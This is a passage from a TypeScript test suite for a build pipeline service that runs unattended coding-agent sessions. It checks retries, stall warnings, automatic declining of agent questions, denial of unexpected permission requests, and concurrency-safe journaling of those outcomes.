      const retried = await service.retryStage(started.id);

      expect(retried).toMatchObject({
        phase: "resolving-conflicts",
        currentSessionIndex: 1,
      });
      expect(retried.error).toBeUndefined();
      expect(retried.failureContext).toBeUndefined();
      expect(retried.stageRetryRequested).toBeUndefined();
      expect(retried.sessions).toHaveLength(2);
      expect(retried.sessions[0]).toMatchObject({
        sdkSessionId: firstSession.sdkSessionId,
        status: "error",
      });
      expect(retried.sessions[1]).toMatchObject({
        phase: "resolve-conflicts",
        status: "running",
      });
      expect(retried.sessions[1]?.sdkSessionId)
        .not.toBe(firstSession.sdkSessionId);
      expect(provider.created.at(-1)?.phase).toBe("resolve-conflicts");
      expect(provider.sent.at(-1)?.sessionId)
        .toBe(retried.sessions[1]?.sdkSessionId);
    });
  });

  test("forwards unattended interaction metadata and keeps pending blocked work parked", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      expect(provider.created).toContainEqual({
        phase: "build",
        label: "Build Session",
        options: expect.objectContaining({
          interaction: expect.objectContaining({
            origin: "build-pipeline",
            interactionPolicy: UNATTENDED_AGENT_INTERACTION_POLICY,
            phase: "build",
            workflowId: started.id,
            provider: "claude",
            fence: expect.any(String),
          }),
        }),
      });
      expect(provider.registered).toContainEqual(expect.objectContaining({
        sessionId: "build-1",
        interaction: expect.objectContaining({
          origin: "build-pipeline",
          interactionPolicy: UNATTENDED_AGENT_INTERACTION_POLICY,
          phase: "build",
          workflowId: started.id,
          provider: "claude",
          fence: expect.any(String),
        }),
      }));
      provider.status = async () => "blocked";
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const blocked = await pipeline(storage, started.id);
      expect(blocked.phase).toBe("building");
      expect(blocked.sessions[blocked.currentSessionIndex]).toMatchObject({
        status: "running",
        origin: "build-pipeline",
        interactionPolicy: UNATTENDED_AGENT_INTERACTION_POLICY,
      });

      const restoredService = new BuildPipelineService(
        storage,
        async <T>(): Promise<T> => {
          throw new Error("A parked session must not invoke backend commands");
        },
        { autoAdvance: false, provider: async () => provider },
      );
      try {
        await restoredService.advanceNow(started.id);
        expect((await pipeline(storage, started.id)).phase).toBe("building");
      } finally {
        await restoredService.shutdown();
      }
    });
  });

  test("warns on transcript silence without aborting and clears the warning on growth", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const record = await storage.getBuildPipeline(started.id);
      if (!record) throw new Error("Pipeline disappeared");
      const snapshot = record.snapshot as BuildPipeline;
      const session = snapshot.sessions[snapshot.currentSessionIndex]!;
      const messages = await provider.messages(session.sdkSessionId);
      session.messages = messages;
      session.messagesFingerprint = `${messages.length}:${JSON.stringify(messages.at(-1))}`;
      const stalledAt = new Date(Date.now() - 11 * 60_000).toISOString();
      session.startedAt = stalledAt;
      session.messagesPersistedAt = stalledAt;
      session.turnStartedAt = stalledAt;
      await storage.saveBuildPipeline(
        snapshot.id,
        snapshot.projectId,
        snapshot.environmentId,
        record.version,
        snapshot,
        record.revision,
      );
      provider.status = async () => "running";

      await service.advanceNow(started.id);
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "building",
        stallWarning: { sessionId: session.sdkSessionId },
      });

      provider.messages = async () => [{
        id: "new-progress",
        role: "assistant",
        parts: [{ type: "text", content: "Progress resumed" }],
      }];
      await service.advanceNow(started.id);
      const resumed = await pipeline(storage, started.id);
      expect(resumed.phase).toBe("building");
      expect(resumed.stallWarning).toBeUndefined();
    });
  });

  test("starts a fresh stall clock whenever a new turn is dispatched", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const record = await storage.getBuildPipeline(started.id);
      if (!record) throw new Error("Pipeline disappeared");
      const snapshot = record.snapshot as BuildPipeline;
      const session = snapshot.sessions[snapshot.currentSessionIndex]!;
      const messages = await provider.messages(session.sdkSessionId);
      const stalledAt = new Date(Date.now() - 11 * 60_000).toISOString();
      session.messages = messages;
      session.messagesFingerprint = `${messages.length}:${JSON.stringify(messages.at(-1))}`;
      session.messagesPersistedAt = stalledAt;
      session.turnStartedAt = stalledAt;
      await storage.saveBuildPipeline(
        snapshot.id,
        snapshot.projectId,
        snapshot.environmentId,
        record.version,
        snapshot,
        record.revision,
      );

      await service.sendMessage(started.id, "Continue with the safe assumption");
      await service.advanceNow(started.id);
      const dispatched = await pipeline(storage, started.id);
      const dispatchedSession = dispatched.sessions[dispatched.currentSessionIndex]!;
      expect(Date.parse(dispatchedSession.turnStartedAt!)).toBeGreaterThan(
        Date.now() - 5_000,
      );

      provider.status = async () => "running";
      await service.advanceNow(started.id);
      expect((await pipeline(storage, started.id)).stallWarning).toBeUndefined();
    });
  });

  test("production OpenCode uses journaled decline/deny enforcement without a grant-once stream", async () => {
    await withService(async (service, storage) => {
      const started = await service.start(startInput({ agentType: "opencode" }));
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const restored = await pipeline(storage, started.id);
      const session = restored.sessions[restored.currentSessionIndex]!;

      const rejected: string[] = [];
      const permissionReplies: Array<{ requestID: string; reply: string }> = [];
      const phaseAtRejection: string[] = [];
      let pendingQuestions: Array<Record<string, unknown>> = [{
        id: "question-1",
        sessionID: session.sdkSessionId,
        questions: [{
          question: "Choose a safe implementation",
          options: [{ label: "Conservative", description: "Smallest change" }],
        }],
      }];
      let pendingPermissions: Array<Record<string, unknown>> = [];
      let subscriptions = 0;
      const client = {
        event: {
          async subscribe() {
            subscriptions += 1;
            throw new Error("The common backend resolver must not subscribe");
          },
        },
        permission: {
          async list() {
            return { data: pendingPermissions };
          },
          async reply(parameters: { requestID: string; reply: string }) {
            permissionReplies.push(parameters);
            pendingPermissions = pendingPermissions.filter(
              ({ id }) => id !== parameters.requestID,
            );
            return { data: true };
          },
        },
        question: {
          async list() {
            return { data: pendingQuestions };
          },
          async reject(parameters: { requestID: string }) {
            const currentPhase = (await pipeline(storage, started.id)).phase;
            pendingQuestions = pendingQuestions.filter(
              ({ id }) => id !== parameters.requestID,
            );
            phaseAtRejection.push(currentPhase);
            rejected.push(parameters.requestID);
            return { data: true };
          },
        },
        session: {
          async status() {
            return { data: { [session.sdkSessionId]: { type: "busy" } } };
          },
        },
      } as unknown as OpencodeClient;
      const production = new BuildPipelineService(
        storage,
        async <T>(command: string): Promise<T> => {
          if (command === "start_local_opencode_server_cmd") {
            return { port: 43210, authToken: "test-token" } as T;
          }
          throw new Error(`Unexpected command: ${command}`);
        },
        {
          autoAdvance: false,
          providerDependencies: { openCodeClient: client, monitorRetryMs: 1 },
        },
      );
      try {
        await production.advanceNow(started.id);
        expect(subscriptions).toBe(0);
        expect(rejected).toEqual(["question-1"]);
        expect(phaseAtRejection).toEqual(["building"]);
        expect(await pipeline(storage, started.id)).toMatchObject({
          phase: "building",
          autoDeclineCount: 1,
          sessions: [expect.objectContaining({
            autoDeclineCount: 1,
            interactionTranscript: [expect.objectContaining({
              id: `opencode:question:${encodeURIComponent(session.sdkSessionId)}:question-1`,
              outcome: "auto-declined-headless",
            })],
          })],
        });
        const firstJournal = await storage.getAgentInteractionResolutionJournal();
        expect(firstJournal.entries).toContainEqual(expect.objectContaining({
          state: "workflow-recorded",
          outcome: "auto-declined",
        }));

        pendingPermissions = [{
          id: "permission-1",
          sessionID: session.sdkSessionId,
          permission: "edit",
          patterns: ["**"],
          title: "Edit files",
          metadata: {},
          time: { created: Date.now() },
        }];
        await production.advanceNow(started.id);
        expect(permissionReplies).toEqual([expect.objectContaining({
          requestID: "permission-1",
          reply: "reject",
        })]);
        expect(await pipeline(storage, started.id)).toMatchObject({
          phase: "failed",
          failureContext: {
            kind: "interactive-request",
            sessionId: session.sdkSessionId,
          },
        });
      } finally {
        await production.shutdown();
      }
    });
  });

  test("declines three Claude questions exactly once and never consumes a queued message as an answer", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const running = await pipeline(storage, started.id);
      const session = running.sessions[running.currentSessionIndex]!;
      const now = Date.now();
      let requests: AgentInteractionRequest[] = Array.from(
        { length: 3 },
        (_, index) => ({
          version: AGENT_INTERACTION_CONTRACT_VERSION,
          id: `question-${index + 1}`,
          provider: "claude" as const,
          kind: "question" as const,
          origin: "build-pipeline" as const,
          sessionId: session.sdkSessionId,
          state: "pending" as const,
          revision: 1,
          presentation: {
            title: `Question ${index + 1}`,
            questions: [{
              id: "choice",
              prompt: "Choose safely",
              required: true,
              multiple: false,
              secret: false,
              allowFreeText: false,
              options: [{
                id: "safe",
                label: "Safe",
                providerValue: "safe",
              }],
            }],
          },
          createdAt: now + index,
          updatedAt: now + index,
        }),
      );
      const resolutions: Array<{ id: string; action: string }> = [];
      (provider as unknown as BuildPipelineProvider & {
        interactions: NonNullable<BuildPipelineProvider["interactions"]>;
      }).interactions = {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId, resolution) {
          resolutions.push({ id: interactionId, action: resolution.action });
          requests = requests.filter((request) => request.id !== interactionId);
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      };

      await service.sendMessage(started.id, "This is a normal follow-up");
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);

      const resolved = await pipeline(storage, started.id);
      expect(resolutions).toEqual([
        { id: "question-1", action: "decline" },
        { id: "question-2", action: "decline" },
        { id: "question-3", action: "decline" },
      ]);
      expect(resolved).toMatchObject({
        phase: "building",
        autoDeclineCount: 3,
        pendingUserMessages: [{ text: "This is a normal follow-up" }],
      });
      expect(resolved.sessions[resolved.currentSessionIndex]).toMatchObject({
        autoDeclineCount: 3,
        interactionTranscript: [
          expect.objectContaining({ id: "question-1" }),
          expect.objectContaining({ id: "question-2" }),
          expect.objectContaining({ id: "question-3" }),
        ],
      });
      const journal = await storage.getAgentInteractionResolutionJournal();
      expect(journal.entries.filter((entry) => entry.claim.workflowId === started.id))
        .toHaveLength(3);
      expect(journal.entries.every((entry) => entry.state === "workflow-recorded"))
        .toBe(true);

      requests = [{
        version: AGENT_INTERACTION_CONTRACT_VERSION,
        id: "permission-1",
        provider: "claude",
        kind: "permission",
        origin: "build-pipeline",
        sessionId: session.sdkSessionId,
        state: "pending",
        revision: 2,
        presentation: {
          title: "Authorize an unexpected privilege",
          questions: [],
        },
        createdAt: now + 10,
        updatedAt: now + 10,
      }];
      await service.advanceNow(started.id);
      expect(resolutions.at(-1)).toEqual({ id: "permission-1", action: "deny" });
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        failureContext: {
          kind: "interactive-request",
          requestId: "permission-1",
        },
      });

      const retried = await service.retryInteractionFailure(started.id);
      expect(retried.phase).toBe("building");
      expect(retried.sessions).toHaveLength(2);
      expect(retried.sessions[1]).toMatchObject({
        phase: "build",
        status: "running",
        interactionPolicy: UNATTENDED_AGENT_INTERACTION_POLICY,
      });
    });
  });

  test("retries an addressing interaction with the findings prompt in build mode", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      // The address stage transfers the completed review conversation into a
      // fresh session, so construct the retry from a real review stage.
      await service.advanceNow(started.id);
      const record = await storage.getBuildPipeline(started.id);
      if (!record) throw new Error("Pipeline disappeared");
      const failed = record.snapshot as BuildPipeline;
      const report: StructuredReviewReport = {
        ...cleanReview,
        issues: [{
          severity: "P1",
          confidence: 90,
          category: "correctness",
          title: "Address this exact finding",
          file: "src/app.ts",
          line: 12,
          symbol: "run",
          description: "The result is wrong.",
          evidence: "The boundary test fails.",
          suggestion: "Correct the boundary.",
          verification: "Run the boundary test.",
        }],
        verdict: { ready: "with-fixes", reasoning: "One fix is required." },
      };
      failed.phase = "failed";
      failed.structuredReview = report;
      failed.failureContext = {
        phase: "addressing",
        kind: "interactive-request",
        sessionId: failed.sessions[failed.currentSessionIndex]!.sdkSessionId,
        requestId: "permission-1",
      };
      await storage.saveBuildPipeline(
        failed.id,
        failed.projectId,
        failed.environmentId,
        record.version,
        failed,
        record.revision,
      );

      const retried = await service.retryInteractionFailure(started.id);
      const dispatch = provider.sent.at(-1)!;
      expect(retried.phase).toBe("addressing");
      expect(retried.structuredReview).toEqual(report);
      expect(retried.sessions.at(-1)).toMatchObject({ phase: "address" });
      expect(provider.created.at(-1)?.options?.mode).toBe("build");
      expect(dispatch.mode).toBe("build");
      expect(dispatch.schema).toBeUndefined();
      expect(dispatch.prompt).toContain("Address this exact finding");
      expect(dispatch.prompt).toContain("orkestrator-handoff-transcript-json");
      expect(dispatch.prompt).toContain("non-interactive build session");
    });
  });

  test("reconciles stale provider outcomes and fails safely while the request is still live", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const running = await pipeline(storage, started.id);
      const session = running.sessions[running.currentSessionIndex]!;
      const request = pendingQuestion(session.sdkSessionId, "stale-question");
      let listCalls = 0;
      let resolveCalls = 0;
      (provider as unknown as BuildPipelineProvider & {
        interactions: NonNullable<BuildPipelineProvider["interactions"]>;
      }).interactions = {
        async listPendingInteractions() {
          listCalls += 1;
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: listCalls,
            requests: [request],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          return { result: "stale", sessionId, interactionId, revision: listCalls };
        },
      };

      await service.advanceNow(started.id);
      expect(resolveCalls).toBe(1);
      expect(listCalls).toBeGreaterThanOrEqual(3);
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        failureContext: {
          kind: "interactive-request",
          requestId: "stale-question",
        },
      });
      const journal = await storage.getAgentInteractionResolutionJournal();
      expect(journal.entries.find((entry) =>
        entry.interactionId === "stale-question"
      )).toMatchObject({ state: "workflow-recorded", outcome: "failed" });
    });
  });

  for (const result of ["rejected", "provider-unavailable"] as const) {
    test(`fails safely when the provider interaction response is ${result}`, async () => {
      await withService(async (service, storage, provider) => {
        const started = await service.start(startInput({ taskId: `task-${result}` }));
        await service.advanceNow(started.id);
        await service.advanceNow(started.id);
        const running = await pipeline(storage, started.id);
        const session = running.sessions[running.currentSessionIndex]!;
        const request = pendingQuestion(session.sdkSessionId, `${result}-question`);
        (provider as unknown as BuildPipelineProvider & {
          interactions: NonNullable<BuildPipelineProvider["interactions"]>;
        }).interactions = {
          async listPendingInteractions() {
            return {
              version: AGENT_INTERACTION_CONTRACT_VERSION,
              revision: 1,
              requests: [request],
            };
          },
          async resolveInteraction(sessionId, interactionId) {
            return { result, sessionId, interactionId, revision: 1 };
          },
        };

        await service.advanceNow(started.id);
        expect(await pipeline(storage, started.id)).toMatchObject({
          phase: "failed",
          failureContext: {
            kind: "interactive-request",
            requestId: request.id,
          },
        });
        const journal = await storage.getAgentInteractionResolutionJournal();
        expect(journal.entries.find((entry) => entry.interactionId === request.id))
          .toMatchObject({ state: "workflow-recorded", outcome: "failed" });
      });
    });
  }

  test("rechecks an absent recovered request after leasing and resolves it if it reappears", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const running = await pipeline(storage, started.id);
      const session = running.sessions[running.currentSessionIndex]!;
      const request = pendingQuestion(session.sdkSessionId, "reappeared-question");
      await storage.updateAgentInteractionResolutionJournal(() => ({
        version: AGENT_INTERACTION_JOURNAL_VERSION,
        entries: [{
          id: "reappeared-journal",
          interactionId: request.id,
          provider: "claude",
          kind: "question",
          sessionId: session.sdkSessionId,
          state: "claimed",
          claim: {
            workflowType: "build-pipeline",
            workflowId: running.id,
            phase: "building",
            fence: session.sessionKey,
            claimedAt: Date.now(),
          },
        }],
      }));
      let listCalls = 0;
      let resolveCalls = 0;
      (provider as unknown as BuildPipelineProvider & {
        interactions: NonNullable<BuildPipelineProvider["interactions"]>;
      }).interactions = {
        async listPendingInteractions() {
          listCalls += 1;
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: listCalls,
            requests: listCalls === 1 ? [] : [request],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          return { result: "applied", sessionId, interactionId, revision: listCalls };
        },
      };

      await service.advanceNow(started.id);
      expect(listCalls).toBeGreaterThanOrEqual(2);
      expect(resolveCalls).toBe(1);
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "building",
        autoDeclineCount: 1,
      });
    });
  });

  test("two backends race a new live interaction claim and converge on one response", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const running = await pipeline(storage, started.id);
      const session = running.sessions[running.currentSessionIndex]!;
      const request = pendingQuestion(session.sdkSessionId, "new-contended-question");
      let requests = [request];
      let initialListCalls = 0;
      let releaseInitialLists!: () => void;
      const bothListed = new Promise<void>((resolve) => {
        releaseInitialLists = resolve;
      });
      let resolveCalls = 0;
      (provider as unknown as BuildPipelineProvider & {
        interactions: NonNullable<BuildPipelineProvider["interactions"]>;
      }).interactions = {
        async listPendingInteractions() {
          initialListCalls += 1;
          if (initialListCalls <= 2) {
            if (initialListCalls === 2) releaseInitialLists();
            await bothListed;
          }
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: initialListCalls,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          requests = [];
          return { result: "applied", sessionId, interactionId, revision: 3 };
        },
      };
      const second = new BuildPipelineService(
        storage,
        async <T>(): Promise<T> => {
          throw new Error("No backend command is expected");
        },
        { autoAdvance: false, provider: async () => provider },
      );
      try {
        expect(running.pendingInteractionResolution).toBeUndefined();
        expect((await storage.getAgentInteractionResolutionJournal()).entries)
          .toHaveLength(0);

        await Promise.all([
          service.advanceNow(started.id),
          second.advanceNow(started.id),
        ]);

        const resolved = await pipeline(storage, started.id);
        expect(resolveCalls).toBe(1);
        expect(resolved.phase).toBe("building");
        expect(resolved.error).toBeUndefined();
        expect(resolved.autoDeclineCount).toBe(1);
        expect(resolved.sessions[resolved.currentSessionIndex]?.interactionTranscript)
          .toEqual([expect.objectContaining({ id: request.id })]);
        const journal = await storage.getAgentInteractionResolutionJournal();
        expect(journal.entries).toContainEqual(expect.objectContaining({
          interactionId: request.id,
          state: "workflow-recorded",
          outcome: "auto-declined",
        }));
      } finally {
        await second.shutdown();
      }
    });
  });

  test("a losing pending-envelope CAS re-reads after the winner records the outcome", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const running = await pipeline(storage, started.id);
      const session = running.sessions[running.currentSessionIndex]!;
      const request = pendingQuestion(session.sdkSessionId, "late-cas-reread-question");
      let requests = [request];
      let initialListCalls = 0;
      let releaseInitialLists!: () => void;
      const bothListed = new Promise<void>((resolve) => {
        releaseInitialLists = resolve;
      });
      let resolveCalls = 0;
      (provider as unknown as BuildPipelineProvider & {
        interactions: NonNullable<BuildPipelineProvider["interactions"]>;
      }).interactions = {
        async listPendingInteractions() {
          initialListCalls += 1;
          if (initialListCalls <= 2) {
            if (initialListCalls === 2) releaseInitialLists();
            await bothListed;
          }
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: initialListCalls,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          requests = [];
          return { result: "applied", sessionId, interactionId, revision: 3 };
        },
      };
      const second = new BuildPipelineService(
        storage,
        async <T>(): Promise<T> => {
          throw new Error("No backend command is expected");
        },
        { autoAdvance: false, provider: async () => provider },
      );
      const originalSave = storage.saveBuildPipeline.bind(storage);
      let pendingSaveAttempts = 0;
      let releasePendingSaves!: () => void;
      const bothPendingSaves = new Promise<void>((resolve) => {
        releasePendingSaves = resolve;
      });
      let releaseWinnerOutcome!: () => void;
      const winnerOutcomeSaved = new Promise<void>((resolve) => {
        releaseWinnerOutcome = resolve;
      });
      let winnerOutcomeWasSaved = false;
      storage.saveBuildPipeline = async (...args) => {
        const candidate = args[4] as BuildPipeline;
        const isPendingEnvelopeSave =
          candidate.pendingInteractionResolution?.interactionId === request.id;
        const isOutcomeSave =
          candidate.pendingInteractionResolution === undefined
          && candidate.sessions.some((candidateSession) =>
            candidateSession.interactionTranscript?.some((entry) =>
              entry.id === request.id
            )
          );
        if (isPendingEnvelopeSave) {
          pendingSaveAttempts += 1;
          if (pendingSaveAttempts === 2) releasePendingSaves();
          await bothPendingSaves;
        }
        try {
          const saved = await originalSave(...args);
          if (isOutcomeSave && !winnerOutcomeWasSaved) {
            winnerOutcomeWasSaved = true;
            releaseWinnerOutcome();
          }
          return saved;
        } catch (error) {
          if (
            isPendingEnvelopeSave
            && error instanceof Error
            && error.message === "Build pipeline revision conflict"
          ) {
            // Surface the losing CAS only after the winner has removed the
            // envelope and durably recorded the terminal interaction outcome.
            await winnerOutcomeSaved;
          }
          throw error;
        }
      };
      try {
        await Promise.all([
          service.advanceNow(started.id),
          second.advanceNow(started.id),
        ]);

        const resolved = await pipeline(storage, started.id);
        expect(pendingSaveAttempts).toBe(2);
        expect(winnerOutcomeWasSaved).toBe(true);
        expect(resolveCalls).toBe(1);
        expect(resolved.phase).toBe("building");
        expect(resolved.error).toBeUndefined();
        expect(resolved.pendingInteractionResolution).toBeUndefined();
        expect(resolved.autoDeclineCount).toBe(1);
        expect(resolved.sessions[resolved.currentSessionIndex]?.interactionTranscript)
          .toEqual([expect.objectContaining({ id: request.id })]);
      } finally {
        storage.saveBuildPipeline = originalSave;
        await second.shutdown();
      }
    });
  });

  test("interaction outcome save merges a concurrent queued user message", async () => {
    await withService(async (service, storage, provider, _invocations, controls) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const running = await pipeline(storage, started.id);
      const session = running.sessions[running.currentSessionIndex]!;
      const request = pendingQuestion(session.sdkSessionId, "outcome-merge-question");
      let requests = [request];
      let resolveCalls = 0;
      (provider as unknown as BuildPipelineProvider & {
        interactions: NonNullable<BuildPipelineProvider["interactions"]>;
      }).interactions = {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: resolveCalls,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          requests = [];
          return { result: "applied", sessionId, interactionId, revision: 1 };
        },
      };
      const originalUpdateJournal = storage
        .updateAgentInteractionResolutionJournal.bind(storage);
      let releaseProviderResolved!: () => void;
      const providerResolved = new Promise<void>((resolve) => {
        releaseProviderResolved = resolve;
      });
      let allowOutcomeSave!: () => void;
      const outcomeSaveAllowed = new Promise<void>((resolve) => {
        allowOutcomeSave = resolve;
      });
      let blockedProviderResolved = false;
      const concurrentStorage = new StorageService(controls.dataDir);
      await concurrentStorage.init();
      storage.updateAgentInteractionResolutionJournal = async (...args) => {
        const journal = await originalUpdateJournal(...args);
        if (
          !blockedProviderResolved
          && journal.entries.some((entry) =>
            entry.interactionId === request.id && entry.state === "provider-resolved"
          )
        ) {
          blockedProviderResolved = true;
          releaseProviderResolved();
          // The provider result and journal transition are durable here, while
          // the service still holds its pre-mutation pipeline revision.
          await outcomeSaveAllowed;
        }
        return journal;
      };
      try {
        const advancing = service.advanceNow(started.id);
        await providerResolved;

        const concurrentRecord = await concurrentStorage.getBuildPipeline(started.id);
        if (!concurrentRecord) throw new Error("Pipeline disappeared");
        const concurrent = concurrentRecord.snapshot as BuildPipeline;
        const concurrentMessage = {
          id: "concurrent-follow-up",
          text: "Preserve this concurrent follow-up",
          createdAt: new Date().toISOString(),
        };
        concurrent.pendingUserMessages = [
          ...(concurrent.pendingUserMessages ?? []),
          concurrentMessage,
        ];
        await concurrentStorage.saveBuildPipeline(
          concurrent.id,
          concurrent.projectId,
          concurrent.environmentId,
          concurrentRecord.version,
          concurrent,
          concurrentRecord.revision,
        );
        allowOutcomeSave();
        await advancing;

        const resolved = await pipeline(storage, started.id);
        expect(blockedProviderResolved).toBe(true);
        expect(resolveCalls).toBe(1);
        expect(resolved.phase).toBe("building");
        expect(resolved.error).toBeUndefined();
        expect(resolved.pendingInteractionResolution).toBeUndefined();
        expect(resolved.pendingUserMessages).toEqual([concurrentMessage]);
        expect(resolved.autoDeclineCount).toBe(1);
        expect(resolved.sessions[resolved.currentSessionIndex]?.interactionTranscript)
          .toEqual([expect.objectContaining({ id: request.id })]);
      } finally {
        allowOutcomeSave();
        storage.updateAgentInteractionResolutionJournal = originalUpdateJournal;
      }
    });
  });

  for (const concurrentAction of ["pause", "cancel"] as const) {
    test(`terminal authorization outcome merges over a concurrent ${concurrentAction}`, async () => {
      await withService(async (service, storage, provider, _invocations, controls) => {
        const started = await service.start(startInput());
        await service.advanceNow(started.id);
        await service.advanceNow(started.id);
        const running = await pipeline(storage, started.id);
        const session = running.sessions[running.currentSessionIndex]!;
        const request: AgentInteractionRequest = {
          ...pendingQuestion(
            session.sdkSessionId,
            `authorization-${concurrentAction}`,
          ),
          kind: "permission",
          presentation: {
            title: "Authorize an unexpected privilege",
            questions: [],
          },
        };
        let requests = [request];
        let resolveCalls = 0;
        let resolutionAction = "";
        (provider as unknown as BuildPipelineProvider & {
          interactions: NonNullable<BuildPipelineProvider["interactions"]>;
        }).interactions = {
          async listPendingInteractions() {
            return {
              version: AGENT_INTERACTION_CONTRACT_VERSION,
              revision: resolveCalls,
              requests,
            };
          },
          async resolveInteraction(sessionId, interactionId, resolution) {
            resolveCalls += 1;
            resolutionAction = resolution.action;
            requests = [];
            return { result: "applied", sessionId, interactionId, revision: 1 };
          },
        };
        const concurrentStorage = new StorageService(controls.dataDir);
        await concurrentStorage.init();
        const concurrentService = new BuildPipelineService(
          concurrentStorage,
          async <T>(): Promise<T> => {
            throw new Error("No backend command is expected");
          },
          { autoAdvance: false, provider: async () => provider },
        );
        const originalUpdateJournal = storage
          .updateAgentInteractionResolutionJournal.bind(storage);
        let releaseProviderResolved!: () => void;
        const providerResolved = new Promise<void>((resolve) => {
          releaseProviderResolved = resolve;
        });
        let allowOutcomeSave!: () => void;
        const outcomeSaveAllowed = new Promise<void>((resolve) => {
          allowOutcomeSave = resolve;
        });
        let blockedProviderResolved = false;
        storage.updateAgentInteractionResolutionJournal = async (...args) => {
          const journal = await originalUpdateJournal(...args);
          if (
            !blockedProviderResolved
            && journal.entries.some((entry) =>
              entry.interactionId === request.id
              && entry.state === "provider-resolved"
            )
          ) {
            blockedProviderResolved = true;
            releaseProviderResolved();
            await outcomeSaveAllowed;
          }
          return journal;
        };
        try {
          const advancing = service.advanceNow(started.id);
          await providerResolved;

          if (concurrentAction === "pause") {
            const paused = await concurrentService.pause(started.id);
            expect(paused).toMatchObject({
              phase: "paused",
              pausedFromPhase: "building",
            });
          } else {
            const cancelled = await concurrentService.cancel(started.id);
            expect(cancelled).toMatchObject({
              phase: "failed",
              error: "Build cancelled",
            });
          }
          allowOutcomeSave();
          await advancing;

          const resolved = await pipeline(storage, started.id);
          expect(isBuildPipeline(resolved)).toBe(true);
          expect(blockedProviderResolved).toBe(true);
          expect(resolveCalls).toBe(1);
          expect(resolutionAction).toBe("deny");
          expect(resolved.pendingInteractionResolution).toBeUndefined();
          if (concurrentAction === "pause") {
            expect(resolved).toMatchObject({
              phase: "failed",
              error: expect.stringContaining("requested unexpected authorization"),
              failureContext: {
                phase: "building",
                kind: "interactive-request",
                sessionId: session.sdkSessionId,
                requestId: request.id,
              },
            });
            expect(resolved.pausedFromPhase).toBeUndefined();
          } else {
            expect(resolved).toMatchObject({
              phase: "failed",
              error: "Build cancelled",
            });
          }
          const journal = await storage.getAgentInteractionResolutionJournal();
          expect(journal.entries).toContainEqual(expect.objectContaining({
            interactionId: request.id,
            state: "workflow-recorded",
            outcome: "denied",
          }));
        } finally {
          allowOutcomeSave();
          storage.updateAgentInteractionResolutionJournal = originalUpdateJournal;
          await concurrentService.shutdown();
        }
      });
    });
  }

  test("fails a live pending interaction whose journal claim cleanup reclaimed", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const record = await storage.getBuildPipeline(started.id);
      if (!record) throw new Error("Pipeline disappeared");
      const running = record.snapshot as BuildPipeline;
      const session = running.sessions[running.currentSessionIndex]!;
      const request = pendingQuestion(session.sdkSessionId, "reclaimed-live-question");
      const claimedAt = Date.now() - AGENT_INTERACTION_CLAIM_RETENTION_MS - 1;
      running.pendingInteractionResolution = {
        journalId: "reclaimed-live-journal",
        sessionKey: session.sessionKey,
        sessionId: session.sdkSessionId,
        interactionId: request.id,
        provider: "claude",
        kind: "question",
        phase: "build",
        requestedAt: claimedAt,
        claimedAt,
        action: "decline-and-continue",
        title: request.presentation.title,
        questions: [],
      };
      await storage.saveBuildPipeline(
        running.id,
        running.projectId,
        running.environmentId,
        record.version,
        running,
        record.revision,
      );
      await storage.updateAgentInteractionResolutionJournal(() => ({
        version: AGENT_INTERACTION_JOURNAL_VERSION,
        entries: [{
          id: "reclaimed-live-journal",
          interactionId: request.id,
          provider: "claude",
          kind: "question",
          sessionId: session.sdkSessionId,
          state: "claimed",
          claim: {
            workflowType: "build-pipeline",
            workflowId: running.id,
            phase: "building",
            fence: session.sessionKey,
            claimedAt,
          },
        }],
      }));
      const reclaimed = await storage.getAgentInteractionResolutionJournal();
      expect(reclaimed.entries).toContainEqual(expect.objectContaining({
        id: "reclaimed-live-journal",
        state: "workflow-recorded",
        outcome: "stale",
      }));
      let resolveCalls = 0;
      (provider as unknown as BuildPipelineProvider & {
